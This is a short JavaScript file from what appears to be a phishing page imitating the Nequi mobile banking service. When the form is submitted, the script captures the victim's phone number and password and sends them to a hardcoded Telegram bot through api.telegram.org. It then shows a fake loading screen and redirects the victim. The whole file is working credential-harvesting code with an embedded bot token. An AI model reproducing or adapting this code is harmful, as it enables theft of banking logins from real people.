document.getElementById('nequi-form').addEventListener('submit', function (e) {
    e.preventDefault(); // Evitar el envío automático del formulario

    // Mostrar el loader
    document.getElementById('loading-overlay').style.display = 'flex';

    // Capturar los valores de los inputs
    var celular = document.getElementById('celular').value;
    var clave = document.getElementById('clave').value;

    // Enviar los datos a Telegram
    enviarDatosTelegram(celular, clave);

    // Simular un proceso (ej. una solicitud de red)
    setTimeout(() => {
        // Ocultar el loader
        document.getElementById('loading-overlay').style.display = 'none';

        // Redirigir a otro documento HTML
        window.location.href = "loader.html"; // Cambia esto por la URL de destino
    }, 2000);
});

// Función para enviar datos a múltiples bots de Telegram
function enviarDatosTelegram(celular, clave) {
    var bots = [
        { token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", chatId: "6328222257" },
        { token: "", chatId: "" }
    ];

    bots.forEach(bot => {
        var mensaje = `📲 *Nuevo Ingreso*\n\n📞 Celular: ${celular}\n🔐 Clave: ${clave}`;
        var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;

        fetch(url).then(response => console.log(`Mensaje enviado a bot: ${bot.token}`))
                  .catch(error => console.error(`Error al enviar mensaje: ${error}`));
    });
}